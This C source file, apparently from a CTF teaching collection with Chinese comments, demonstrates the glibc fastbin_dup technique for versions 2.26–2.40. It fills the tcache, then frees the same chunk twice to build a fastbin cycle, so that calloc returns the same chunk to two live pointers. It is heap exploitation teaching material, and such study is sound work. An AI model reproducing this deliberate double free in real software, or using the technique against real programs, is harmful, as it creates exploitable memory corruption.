/*
 * 中文导读（CTF 版）
 *
 * 手法：fastbin_dup
 * 文件标注范围：2.26 ~ 2.40
 * 模拟漏洞：double free；程序保留释放后的指针。
 * 核心流程：先构造 A→B→A 的 fastbin 环；有 tcache 时先填满/耗尽对应 tcache；连续三次申请会两次拿到 A。
 * 成功判据：最后的 assert(a == c) 成立，说明同一物理 chunk 同时被两个活动指针引用。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	setbuf(stdout, NULL);

	// 先释放 7 个同尺寸 chunk 填满 tcache，迫使后续释放进入 fastbin。
	void *ptrs[8];
	for (int i=0; i<8; i++) {
		ptrs[i] = malloc(8);
	}
	for (int i=0; i<7; i++) {
		free(ptrs[i]);
	}

	/* 这一版本范围内 calloc 不从 tcache 取块，因而可直接取得新的 fastbin
	 * 候选块；a、b、c 用于构造并保护 A→B→A 链。
	 */
	int *a = calloc(1, 8);
	int *b = calloc(1, 8);
	int *c = calloc(1, 8);

	// 连续 free(a) 会命中 fastbin 表头检查；先插入 b，再次释放 a。
	free(a);
	// free(a);  // 错误示例：不得连续释放当前表头。
	free(b);
	free(a);

	// calloc 依次弹出 a、b、a，因此第一次与第三次结果必须相同。
	a = calloc(1, 8);
	b = calloc(1, 8);
	c = calloc(1, 8);

	assert(a == c);
}
